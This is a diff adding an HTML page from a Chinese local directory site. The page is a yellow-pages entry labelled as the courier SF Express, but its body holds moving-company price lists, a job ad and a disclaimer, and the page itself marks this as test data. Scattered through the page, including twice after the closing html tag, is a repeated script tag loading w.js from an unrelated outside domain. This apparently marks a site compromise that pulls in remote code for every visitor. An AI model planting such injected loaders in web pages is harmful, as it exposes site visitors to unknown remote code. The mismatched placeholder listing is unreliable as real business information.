@@ -1,0 +1,354 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<title>顺丰快递-北京市东城区东四十条12345号-集居民搬家、办公室搬迁、搬家货运、长短途运输、临时仓储、物品包装、拆装家具、计时工服务、钢琴搬运、重型设备迁移、空调移机、服务器搬迁为一体的大型搬家公司-12345678-http://www.baidu.com</title>
+<meta name="keywords" content="关键词,关键词,关键词,关键词,关键词,关键词,关键词,关键词" />
+<meta name="description" content="便民黄页栏目介绍" />
+<link href="../template/default/skin/yp2011.css" type="text/css" rel="stylesheet" />
+<link id="themecss" rel="stylesheet" rev="stylesheet" href="../template/default/skin/theme/theme1.css" type="text/css">
+<script src="../template/default/js/common.js"></script>
+<script src="../template/default/js/javascript.js"></script>
+<script type="text/javascript" src="../template/default/js/jquery.js"></script>
+<script type="text/javascript" src="../template/default/js/rbtCss.js"></script>
+</head>
+<base href="http://www.shanghaiw.cn/114/" />
+<script>loadss();</script>
+<body bgcolor="#e6e6e6">
+<div class="wrapper">
+	<script>var nowdomain="http://www.shanghaiw.cn/";var shouyecss="1";</script>
+<script type="text/javascript" src="../template/default/js/java.js"></script>
+<script type="text/javascript">
+$("#channel_nav").ready(function(){
+		var url = window.location.href;
+		if(url){
+				var channel = $("#channel_nav ul li "),
+				url = url.toLowerCase();
+				for(var i=0; i<channel.length; i++){
+						var that = channel.eq(i);
+						var forlink = $("a",that).attr("href").toLowerCase();
+						if(url.indexOf(forlink)>=0){
+								$("#channel_nav ul li a.current").removeClass();
+								$("a",that).addClass("current")
+						}
+				}
+		}
+})
+</script>
+<link rel="stylesheet" href="../template/default/skin/head3.css" />
+<link rel="stylesheet" href="../template/default/skin/global3.css" />
+<div id="header">
+  <div class="topBar fix">
+    <div class="loginBar" id="islogin">　 </div><script language="javascript">showlogin("http://www.shanghaiw.cn/request.aspx?action=islogin");</script>
+    <div class="fabu" id="list_menu_hover"><a href="#" class="quickly">快速发布</a>
+      <div id="list_menu" style="display:none;">
+        <p><a href="http://www.shanghaiw.cn/live/fabu.html">生活信息</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/myjianli.aspx#tt3">求职简历</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/myzhiwei.aspx?action=add#tt7">招聘信息</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/myarticle.aspx?action=add#tt6">新闻投稿</a></p>
+        <p><a href="http://www.shanghaiw.cn/company/join.aspx#tt8">登记店铺</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/mygood.aspx?action=add#tt10">发布商品</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/manage_chuzhu.aspx?action=add#tt3">房源出租</a></p>
+        <p><a href="http://www.shanghaiw.cn/member/manage_chushou.aspx?action=add#tt3">房源出售</a></p>
+      </div>
+    </div>
+  </div>
+  <div class="fix">
+    <h1 class="logo"><a href="http://www.shanghaiw.cn/" title="【赤峰商海网】"><img src="../UploadFile/index/2012/10-31/20121031155257456575.gif"  alt="【赤峰商海网】" /></a></h1>
+    <div class="logoInfo"> <span class="kh">赤峰市第一综合性门户信息网站</span> <span class="change_city"><a onmouseover="this.style.cursor='hand';" onclick="itMouse();parent.document.getElementById('city-pop').style.visibility='visible'">[去其他城市]</a><script src="../template/default/js/index/city.js"></script></span> </div>
+    <div class="topAvd"><p>
+	<a href="http://163k.com" target="_blank"></a>
+</p></div>
+    <div class="hours24">0476-5969222</div>
+  </div>
+  <div class="nav" id="channel_nav">
+    <ul class="navZone fix">
+      <li  class='index' ><a href="/"   class="current">首页</a></li><li  ><a href="/live/"  >生活信息</a><sup class='re'></sup></li><li  ><a href="/house/"  >房产频道</a><sup class='xin'></sup></li><li  ><a href="/job/"  >招聘求职</a></li><li  ><a href="/shop/"  >同城网购</a></li><li  ><a href="/tuangou/"  >团购活动</a></li><li  ><a href="/company/"  >口碑商家</a><sup class='qiang'></sup></li><li  ><a href="/article/"  >本地资讯</a></li><li  ><a href="http://www.shanghaiw.cn/ad/lvyou/index.asp"  >旅游频道</a></li>
+    </ul>
+    <ul class="nav_sub fix">
+     <li ><a href="http://www.shanghaiw.cn/114/index.html" title="便民黄页" ><b>便民黄页</b></a></li><li ><a href="http://www.shanghaiw.cn/cuxiao/index.html" title="打折大全" >打折大全</a></li><li ><a href="http://www.shanghaiw.cn/cuxiao/card.aspx" title="打 折 卡" >打 折 卡</a></li><li ><a href="http://www.shanghaiw.cn/video/" title="视频逛街" ><b><font color='#F70909'>视频逛街</font></b></a></li><li ><a href="http://www.shanghaiw.cn/coupon/index.html" title="优 惠 券" >优 惠 券</a></li><li ><a href="http://www.shanghaiw.cn/photo/index.html" title="电子相册" >电子相册</a></li><li ><a href="http://www.shanghaiw.cn/gift/index.html" title="礼品兑换" >礼品兑换</a></li><li ><a href="http://www.shanghaiw.cn/map/index.html" title="地图频道" >地图频道</a></li><li ><a href="http://www.shanghaiw.cn/diantai/index.html" title="在线电台" ><font color='#F73809'>在线电台</font></a></li><li ><a href="http://www.shanghaiw.cn/cuxiao/notice.aspx" title="商家动态" >商家动态</a></li><li ><a href="http://www.shanghaiw.cn/daohang/" title="上网导航" >上网导航</a></li><li ><a href="http://www.shanghaiw.cn/mp3/index.html" title="音 乐 盒" ><font color='#F73809'>音 乐 盒</font></a></li><li ><a href="http://www.shanghaiw.cn/history/index.html" title="历史今天" ><font color='#226DDD'>历史今天</font></a></li><li class="nobor"><a href="http://www.shanghaiw.cn/calendar/index.html" title="万 年 历" ><font color='#D52B4D'>万 年 历</font></a></li><li ><a href="http://www.shanghaiw.cn/pps/index.html" title="在线影视" ><font color='#D52B4D'>在线影视</font></a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="http://www.shanghaiw.cn/114/?action=add" title="企业建站" ><b>企业建站</b></a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li><li ><a href="#" title="自定义栏" >自定义栏</a></li>
+    </ul>
+    <div class="po_menu"><a href="http://www.shanghaiw.cn/help/">帮助</a>|<a href="http://www.shanghaiw.cn/zonghe.aspx">搜索</a>|<a href="http://www.shanghaiw.cn/service/">留言</a></div>
+  </div>
+</div>
+<!-- 当前位置+颜色切换 -->
+<div class="lcBox clearfix" style="margin-bottom:6px;">
+  <div class="location">您当前的位置：<a href="http://www.shanghaiw.cn/">首页</a> > <a href='index.html'>超级黄页</a> -> 顺丰快递</div>
+  
+</div>
+<!-- 当前位置+颜色切换 -->
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
+<script>
+/*topBar下拉*/
+$(function(){
+	$("#list_menu_hover").hover(function(){
+		$("#list_menu").fadeIn("slow");
+	},function(){
+		$("#list_menu").fadeOut("fast");
+	});   
+});
+</script>
+<div class="loginPop" id="loginPop" style="display:none;">
+	<div class="hd fix"><h3 class="h3">快速登录</h3><a href="javascript:hiddenheadlogin();" id="close" class="close">关闭</a></div>
+	<div class="bd">
+		<form id="formRegStep1Main" style="margin:0" name="formRegheadMain" method="post" onsubmit="return checkheadlogin();">
+		<ul class="fix">
+			<li class="fix"><span class="sp_01">用户名：</span><span class="sp_02"><input type="text" class="s_t"  name="logname"/></span></li>
+			<li class="fix"><span class="sp_01">密　码：</span><span class="sp_02"><input type="password" class="s_t"  name="originalLogpasswd"/></span><span class="sp_03"><a href="http://www.shanghaiw.cn/find.aspx">忘记密码？</a></span></li>
+			<li class="l_3"><input class="cb" type="checkbox"  name="remember_password" id="remember_password"/>记住密码 <span class="t">(请不要在网吧随意开启)</span></li>
+			<li class="l_4"><button type="submit">登录</button></li>
+		</ul>
+		<div class="register">
+			<i class="icon"></i><span class="st"><a href="javascript:window.location.href='http://www.shanghaiw.cn/member/register.html?from='+window.location.href+'';">还不是会员？请注册</a>，只需几秒钟即可完成！</span>
+		</div>
+		</form>
+	</div>
+</div>
+
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
+	<div id="content" class="yp2011">
+			<div class="green"><!-- orange | blue | green | purple | brown | red -->
+				<div class="box_a">
+				<div class="b_1 clearfix">
+					<h2 class="h2">顺丰快递</h2>
+					<span class="fr">登记：<em>2011-7-10</em>　|　浏览 <em class="view">258</em> 次</span>
+				</div>
+				<div class="b_2" style="width:880px;padding:15px 30px;">
+				<table class="tb01" width="100%" cellpadding="0" cellspacing="0" border="0">
+					<tbody>
+						<tr>
+							<td>机构名称：<em>顺丰快递</em></td>
+							<td> <!--网站地址：<a href="http://www.baidu.com" target=_blank>http://www.baidu.com</a>--></td>
+                            <td width="260" rowspan="4"><iframe src="http://www.shanghaiw.cn/ezmarker/map.aspx?action=bm&id=70"  width="260" height="170" scrolling="no" frameborder="0" ></iframe>
+                            <table width="100%">
+                              <tr>
+                                <td align="left">&nbsp;</td>
+                                <Td align="right"><a href="javascript:showbigmap('bm','70',escape('顺丰快递'),escape('北京市东城区东四十条12345号'));" rel="nofollow">查看大图>></a></Td>
+                              </tr>
+                            </table>
+                            </td>
+						</tr>
+						<tr>
+							<td>行业分类：<em>维修/装修>装修装饰</em></td>
+							<td>电子邮件：<em>xxxxxx@126.com</em></td>
+						</tr>
+						<tr>
+							<td>联系地址：<em>北京市东城区东四十条12345号</em></td>
+							<td>认证情况：<img src="../template/default/images/yellowurlicon_05.gif" alt="手机认证" style="display:"  /> <img src="../template/default/images/yellowurlicon_03.gif" alt="邮箱认证"  style="display:"/> <img src="../template/default/images/yellowurlicon_07.gif" alt="身份验证"  style="display:"/> <img src="../template/default/images/yellowurlicon_09.gif" alt="执照验证"  style="display:" /></td>
+						</tr>
+						<tr>
+							<td>联系电话：<em class="tel_txt">12345678</em></td>
+							<td><img src="../template/default/images/yellowurlicon_16.gif" alt="" /> <em>查找更多关于“<a href="http://www.baidu.com/s?ie=UTF-8&wd=%e9%a1%ba%e4%b8%b0%e5%bf%ab%e9%80%92" target=_blank >顺丰快递</a>”的信息</em></td>
+						</tr>
+					</tbody>
+				</table>
+				</div>
+				<div class="b_3"><div class="b_3_bg" id="TabAdS02">
+						<div class="change_tab">
+							<ul class="clearfix tab-hd">
+								<li class="select"><a href="javascript:;">联系我们</a></li><li><a href="javascript:;">服务项目</a></li><li><a href="javascript:;">招商加盟</a></li><li><a href="javascript:;">服务项目</a></li><li><a href="javascript:;">免责声明</a></li><li><a href="javascript:;">服务介绍</a></li>
+							</ul>
+						</div>
+						<div class="wen_all tab-cont"  ><p>
+	幸福快运搬家公司搬家服务热线010--88888888，是集居民搬家、办公室搬迁、搬家货运、长短途运输、临时仓储、物品包装、拆装家具、计时工服务、钢琴搬运、重型设备迁移、空调移机、服务器搬迁为一体的大型搬家公司，现有各种作业车辆170余部，员工近600名。中心在北京地区设有多个分部，充分利用先进的计算机网络统一调度平台就近派车，确保及时有效、周到服务、安全放心地为您提供服务。<br />
+	搬家公司贯彻&ldquo;以满足客户要求为己任，以客户永远满意为标准，以保持行业领先为目标&rdquo;的质量方针，经过长期的市场洗礼&ldquo;千喜搬家&rdquo;已成为老百姓心中的品牌。<br />
+	搬家公司通过ISO9001:2000国际标准质量体系认证，标志着北京千喜搬家公司中心的内部管理水平大为提高，服务能力大为增强。它大大地改善了北京千喜搬家公司的外在形象，提升了中心的市场竞争力，缩小了与国际领先企业的差距，在朝着成为国际先进经营开发企业的道路上又迈出了一大步。<br />
+	起价费<br />
+	车型; 四环外 四环内<br />
+	载重量2吨封闭货车 200元/车 200元/车<br />
+	载重量2吨敞车 280元/车 300元/车<br />
+	载重量3吨封闭货车 320元/车 340元/车<br />
+	注：1、上述价格为实际运输距离在十公里以内的每车次单程搬运。 2、&ldquo;四环外&rdquo;是指搬出搬入地址均在四环以外，&ldquo;四环内&rdquo;是指搬出搬入地址至少有一处在四环内。<br />
+	附加费<br />
+	楼层费 无电梯或不能使用电梯搬运时，含二层以上，每上、下一层加收楼层费10元，从第七层 开始每层加收20元<br />
+	途中装卸费 每多装卸一个地点加收50元<br />
+	超公里费 搬出与搬入地点实际距离超过十公里以后，每超出一公里加收5元<br />
+	平面搬运距离费 需要人工平面搬运距离超过十米时，每超1米每车次加收2元<br />
+	晚间服务费 不另收费！<br />
+	延误工时费 因客户原因造成作业车组到位后不能工作延误工时，每小时加收80元<br />
+	空驶费 车辆到位后，客户取消用车时每车次收取空驶费100元<br />
+	贵重物品费<br />
+	钢琴搬运 单搬钢琴起价费，四环以内280元，四环以外250元<br />
+	其它 大型复印机、保险柜、大鱼缸、大镜子、健身器材、34寸以上电视、背投、液晶电视、 200立升以上冰箱每件加收50&mdash;200元<br />
+	纸箱费<br />
+	普通资料箱：尺寸长60cm、宽40 cm、高40 cm 10元/个<br />
+	出口专用资料箱：尺寸长60cm、宽40cm、高40cm 12元/个<br />
+	电脑箱：尺寸长50cm、宽50 cm、高50 cm 15元/个<br />
+	挂衣箱：尺寸长50cm、宽50 cm、高1200 cm 45元/个<br />
+	注：1、专送纸箱每次收费30－160元 2、为办公室搬迁提供塑料周转箱的租用<br />
+	家具拆装费<br />
+	二门柜 80元/个<br />
+	三门柜 120元/个<br />
+	四门柜 160元/个<br />
+	梳妆台、床 40元/个<br />
+	拆装办公隔断 40元/个<br />
+	拆装板台、会议桌 50－150元/个<br />
+	推拉门100元，长度2米以上另议<br />
+	空调拆装费<br />
+	空调类型 单拆 单装 拆装<br />
+	窗机 50元 50元 100元<br />
+	1.5匹（含）以下壁挂 80元 80元 100元<br />
+	1.5匹（含）以下一拖二 140元 180元 300元<br />
+	2匹壁挂、柜机 160元 200元; 280元<br />
+	3匹柜机 160元; 240元 380元<br />
+	5匹柜机 200元 300元 480元<br />
+	其它 打孔：砖楼50元/个、板楼80元/个、塔楼100元/个。加氟40元/压、加管80元/米、加线20元/米<br />
+	注：此价格根据季节可浮动<br />
+	计时服务费<br />
+	仅用工人搬运不需要车辆时，每人每小时收费40元<br />
+	长途运输费<br />
+	金杯车 3元/公里<br />
+	载重量2吨货车 4.5元/公里<br />
+	载重量3吨货车 5元/公里<br />
+	联系我时请说明是在58同城看到的，谢谢！</p>
+<p>
+	<span style="color: #b22222">&lt;提醒：本信息仅作为系统测试数据之用，切勿当真!&gt;</span></p>
+</div><div class="wen_all tab-cont"  ><p>
+	车型; 四环外 四环内<br />
+	载重量2吨封闭货车 200元/车 200元/车<br />
+	载重量2吨敞车 280元/车 300元/车<br />
+	载重量3吨封闭货车 320元/车 340元/车<br />
+	注：1、上述价格为实际运输距离在十公里以内的每车次单程搬运。 2、&ldquo;四环外&rdquo;是指搬出搬入地址均在四环以外，&ldquo;四环内&rdquo;是指搬出搬入地址至少有一处在四环内。<br />
+	附加费<br />
+	楼层费 无电梯或不能使用电梯搬运时，含二层以上，每上、下一层加收楼层费10元，从第七层 开始每层加收20元<br />
+	途中装卸费 每多装卸一个地点加收50元<br />
+	超公里费 搬出与搬入地点实际距离超过十公里以后，每超出一公里加收5元<br />
+	平面搬运距离费 需要人工平面搬运距离超过十米时，每超1米每车次加收2元<br />
+	晚间服务费 不另收费！<br />
+	延误工时费 因客户原因造成作业车组到位后不能工作延误工时，每小时加收80元<br />
+	空驶费 车辆到位后，客户取消用车时每车次收取空驶费100元<br />
+	贵重物品费<br />
+	钢琴搬运 单搬钢琴起价费，四环以内280元，四环以外250元<br />
+	其它 大型复印机、保险柜、大鱼缸、大镜子、健身器材、34寸以上电视、背投、液晶电视、 200立升以上冰箱每件加收50&mdash;200元<br />
+	纸箱费<br />
+	普通资料箱：尺寸长60cm、宽40 cm、高40 cm 10元/个<br />
+	出口专用资料箱：尺寸长60cm、宽40cm、高40cm 12元/个<br />
+	电脑箱：尺寸长50cm、宽50 cm、高50 cm 15元/个<br />
+	挂衣箱：尺寸长50cm、宽50 cm、高1200 cm 45元/个<br />
+	注：1、专送纸箱每次收费30－160元 2、为办公室搬迁提供塑料周转箱的租用<br />
+	家具拆装费<br />
+	&nbsp;</p>
+</div><div class="wen_all tab-cont"  ><p>
+	纸箱费<br />
+	普通资料箱：尺寸长60cm、宽40 cm、高40 cm 10元/个<br />
+	出口专用资料箱：尺寸长60cm、宽40cm、高40cm 12元/个<br />
+	电脑箱：尺寸长50cm、宽50 cm、高50 cm 15元/个<br />
+	挂衣箱：尺寸长50cm、宽50 cm、高1200 cm 45元/个<br />
+	注：1、专送纸箱每次收费30－160元 2、为办公室搬迁提供塑料周转箱的租用<br />
+	家具拆装费<br />
+	二门柜 80元/个<br />
+	三门柜 120元/个<br />
+	四门柜 160元/个<br />
+	梳妆台、床 40元/个<br />
+	拆装办公隔断 40元/个<br />
+	拆装板台、会议桌 50－150元/个<br />
+	推拉门100元，长度2米以上另议<br />
+	空调拆装费<br />
+	空调类型 单拆 单装 拆装<br />
+	窗机 50元 50元 100元<br />
+	1.5匹（含）以下壁挂 80元 80元 100元<br />
+	1.5匹（含）以下一拖二 140元 180元 300元<br />
+	2匹壁挂、柜机 160元 200元; 280元<br />
+	3匹柜机 160元; 240元 380元<br />
+	5匹柜机 200元 300元 480元<br />
+	其它 打孔：砖楼50元/个、板楼80元/个、塔楼100元/个。加氟40元/压、加管80元/米、加线20元/米<br />
+	注：此价格根据季节可浮动<br />
+	计时服务费<br />
+	仅用工人搬运不需要车辆时，每人每小时收费40元<br />
+	长途运输费<br />
+	金杯车 3元/公里<br />
+	载重量2吨货车 4.5元/公里<br />
+	载重量3吨货车 5元/公里</p>
+</div><div class="wen_all tab-cont"  ><p>
+	职位描述：<br />
+	工作职责： 1.对互联网市场发展趋势有敏锐的洞察力和创新意识及良好的分析能力、研判能力，能够深刻把握用户需求； 2.制定所负责社区及旅游目的地类产品项目的规划和具体实施，制定产品项目的MRD及PRD文档； 3.根据需求分析进行产品开发规划，有很强的产品组合能力，对用户体验，产品案例分析有很强的把控能力； 4.对网站相关内容进行合理的UI、UE的栏目规划； 5.建立完善的信息库，目录体系，并持续对其进行跟踪评估分析，提升用户体验； 6.负责产品的全过程产品研究与管理，包括市场研究分析、竞争对手追踪、需求收集与分析、产品策略与计划、系统功能设计与文案等； 7.负责与跨职能的内部各部门的合作、沟通以及收集反馈，并协调各资源，确保产品项目规划顺利开展。 <br />
+	任职资格：<br />
+	1.了解社区类网站的运作规律，熟悉网站建设所需要的流程； 2.熟悉使用Axure/Visio等软件进行方案撰写，具备内部提案能力； 3.能较好的搭建各相关岗位之间的桥梁，了解网站设计和制作的基本理论； 4.良好的沟通能力和团队合作能力，能够与技术人员进行有效的沟通； 5.有跨行业思考和分析能力，基本的用户体验优化能力； 6.3年以上互联网行业网站策划、产品开发工作经验，并有突出作品者优先考虑。 7.其他：请在投递简历时链接自己的个人作品，或面试时携带自己的作品，我们将优先安排面试。 <br />
+	申请该职位</p>
+</div><div class="wen_all tab-cont"  ><p>
+	不负责监控或审查用户在本站上发送或邮寄的信息或相互之间单独交流的任何领域中的信息，包括但不限于交谈室、公告牌或其他用户论坛以及任何交流内容。对有关任何这类交流的内容不承担任何责任，无论它们是否会引起诽谤、隐私、淫秽或其它方面的问题。保留在发现时删除此类信息或包含其它不良内容的信息的权利。</p>
+</div><div class="wen_all tab-cont"  ><p>
+	自定义编辑内容区域</p>
+</div>
+				</div>
+				<script type="text/javascript" >
+				function ResizeImages()
+				{
+				   var myimg,oldwidth,oldheight;
+				   var maxwidth=880;
+				   var maxheight=700
+				   var imgs = document.getElementById('TabAdS02').getElementsByTagName('img');   
+				   
+				   for(i=0;i<imgs.length;i++){
+					 myimg = imgs[i];
+				
+					 if(myimg.width > myimg.height)
+					 {
+						 if(myimg.width > maxwidth)
+						 {
+							oldwidth = myimg.width;
+							myimg.height = myimg.height * (maxwidth/oldwidth);
+							myimg.width = maxwidth;
+							
+						 }
+					 }else{
+						 if(myimg.height > maxheight)
+						 {
+							oldheight = myimg.height;
+							myimg.width = myimg.width * (maxheight/oldheight);
+							myimg.height = maxheight;
+							
+						 }
+					 }
+				   }
+				}
+				ResizeImages();
+				</script>
+			</div>
+		</div>
+		</div>
+		<div class="blank10"></div>
+		<div class="yp_mbox">
+			<div class="hd"><h3 class="title">当前行业下其他机构</h3></div>
+			<div class="bd">
+				<ul class="clearfix">
+					<li><a href='http://www.shanghaiw.cn/114/fuwu_70.html'>顺丰快递</a></li><li><a href='http://www.shanghaiw.cn/114/fuwu_69.html'>北辰搬家公司</a></li><li><a href='http://www.shanghaiw.cn/114/fuwu_68.html'>健康咨询热线</a></li><li><a href='http://www.shanghaiw.cn/114/fuwu_67.html'>残疾人心理咨询</a></li><li><a href='http://www.shanghaiw.cn/114/fuwu_66.html'>儿童心理咨询</a></li><li><a href='http://www.shanghaiw.cn/114/fuwu_65.html'>戒毒热线</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="services_01">如需对上述信息进行修改、删除、举报，请联系网站客服：<img src="../template/default/images/yu_tel.gif" alt="" /> 0476-5969222　<a href="http://sighttp.qq.com/authd?IDKEY=266e4588ec48bb3a497277b4b1477812335b297b807cdf42"><img src="../template/default/images/qq_online.gif" alt="" /> 757935071</a>　<a href="http://sighttp.qq.com/authd?IDKEY=266e4588ec48bb3a497277b4b1477812335b297b807cdf42"><img src="../template/default/images/qq_online.gif" alt="" /> 207136296</a></div>
+	</div>
+	<!-- 页脚 -->
+<link rel="stylesheet" href="/template/default/skin/footer.css" />
+<div id="footer" class="clearfix">
+  <div  style="background:url(/UploadFile/index/2012/11-1/2012111813563182329.gif) no-repeat 0 0;float:left; display:inline; margin-right:12px; width:263px; height:57px; margin-top:10px;" title="【赤峰商海网】"></div>
+  <div class="foot_info">
+    <p class="foot_nav"><a href="#" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.shanghaiw.cn/');">设为首页</a> | <a href="javascript:window.external.AddFavorite('http://www.shanghaiw.cn/','【赤峰商海网】')">加为收藏</a> | <a href='http://www.shanghaiw.cn/help/article_1.html' target='_blank'>网站介绍</a> | <a href='http://www.shanghaiw.cn/help/article_7.html' target='_blank'>关于我们</a> | <a href='http://www.shanghaiw.cn/help/article_10.html' target='_blank'>服务条款</a> | <a href='http://www.shanghaiw.cn/help/article_11.html' target='_blank'>广告服务</a> | <a href='http://www.shanghaiw.cn/help/article_12.html' target='_blank'>招聘信息</a> | <a href='http://www.shanghaiw.cn/help/article_14.html' target='_blank'>免责声明</a> | <a href='http://www.shanghaiw.cn/help/article_13.html' target='_blank'>联系我们</a></p>
+    Copyright @ 2003-2010 163k.com All Right Reserved 赤峰商海网为互联网事业发展助跑<br />
+    <a href="http://www.shanghaiw.cn/">【赤峰商海网】</a> 版权所有 网站备案：<a href="http://www.miibeian.gov.cn/" target="_blank">蒙ICP备11001743号-1</a>&nbsp;&nbsp;<script src="http://s4.cnzz.com/stat.php?id=4800974&web_id=4800974&show=pic" language="JavaScript"></script>
+ </div>
+  <div class="safety"><img src="/template/default/images/bqicon.jpg" alt="" /></div>
+  <div class="clear"></div>
+  <div class="bor"></div>
+</div>
+<Script src="http://www.shanghaiw.cn/request.aspx?action=createindex"></script>
+
+<!-- 页脚 结束 -->
+
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
+</div>
+<div id="mask" style="display:none"></div>
+<script type="text/javascript" src="../template/default/js/jquery.js"></script>
+<script type="text/javascript" src="../template/default/js/jQuery.tabs.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+	$("#TabAdS02").TabADS2();
+});
+</script>
+
+
+</body>
+</html>
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
